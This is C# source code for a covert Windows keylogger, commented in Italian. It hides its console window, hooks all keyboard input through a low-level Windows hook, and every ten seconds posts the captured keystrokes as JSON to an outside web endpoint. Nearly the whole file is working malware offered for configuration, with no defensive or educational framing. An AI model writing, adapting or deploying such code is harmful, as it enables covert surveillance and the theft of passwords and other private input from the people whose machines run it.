using System;
using System.Diagnostics;
using System.Runtime.InteropServices;
using System.Text.Json;
using System.Text;
using System.Windows.Forms;
using static System.Runtime.InteropServices.JavaScript.JSType;

namespace Keylogger
{

    public class KeyloggerProgram
    {
        // modificare per configurare il keylogger
        private static string HOST = "https://spider.free.beeceptor.com";
        private static int INTERVAL = 10; // in secondi

        private static string keylog = "";
        private static HttpClient client = new HttpClient();

        // keys record utils
        [DllImport("user32.dll")]
        public static extern IntPtr SetWindowsHookEx(int idHook, HookCallbackDelegate lpfn, IntPtr wParam, uint lParam);
        [DllImport("kernel32.dll")]
        public static extern IntPtr GetModuleHandle(string lpModuleName);
        [DllImport("user32.dll")]
        public static extern IntPtr CallNextHookEx(IntPtr hhk, int nCode, IntPtr wParam, IntPtr lParam);

        // console utils
        [DllImport("kernel32.dll")]
        static extern IntPtr GetConsoleWindow();
        [DllImport("user32.dll")]
        static extern bool ShowWindow(IntPtr hWnd, int nCmdShow);

        private static int WH_KEYBOARD_LL = 13;
        private static int WM_KEYDOWN = 0x100;

        public static void Main(string[] args)
        {
            // nasconde la console
            var handle = GetConsoleWindow();
            ShowWindow(handle, 0);

            HookCallbackDelegate hcDelegate = HookCallback;

            string mainModuleName = Process.GetCurrentProcess().MainModule.ModuleName;
            IntPtr hook = SetWindowsHookEx(WH_KEYBOARD_LL, hcDelegate, GetModuleHandle(mainModuleName), 0);

            // invia periodicamente keylog
            System.Threading.Timer timer = new System.Threading.Timer(SendPOST, null, 0, INTERVAL * 1000);

            Application.Run();
        }

        static async void SendPOST(object timerState)
        {
            string tmp;

            // svuota keylog
            lock(keylog)
            {
                tmp = keylog;
                keylog = "";
            }

            // crea il payload
            var payload = new Dictionary<string, string>();
            payload.Add("keylog", tmp);

            var jsonData = JsonSerializer.Serialize(payload);
            var content = new StringContent(jsonData, Encoding.UTF8, "application/json");

            // invia la richiesta POST
            var resp = await client.PostAsync(HOST, content);
            resp.EnsureSuccessStatusCode();
        }

        public static IntPtr HookCallback(int nCode, IntPtr wParam, IntPtr lParam)
        {
            if (nCode >= 0 && wParam == (IntPtr)WM_KEYDOWN)
            {
                int vkCode = Marshal.ReadInt32(lParam);
                lock(keylog)
                {
                    keylog = keylog + formatKey((Keys)vkCode);
                }
            }
            return CallNextHookEx(IntPtr.Zero, nCode, wParam, lParam);
        }

        private static string formatKey(Keys key)
        {
            string strKey = "";

            switch(key)
            {
                case Keys.Escape:
                    strKey = "[ESC]";
                    break;
                case Keys.Space:
                    strKey = " ";
                    break;
                case Keys.LControlKey:
                    strKey = "[CTRL_L]";
                    break;
                case Keys.RControlKey:
                    strKey = "[CTRL_R]";
                    break;
                case Keys.Enter:
                    strKey = "[ENTER]";
                    break;
                case Keys.LShiftKey | Keys.RShiftKey:
                    strKey = "[SHIFT]";
                    break;
                default:
                    strKey = "" + key;
                    break;
            }

            return strKey;
        }

        public delegate IntPtr HookCallbackDelegate(int nCode, IntPtr wParam, IntPtr lParam);
    }
}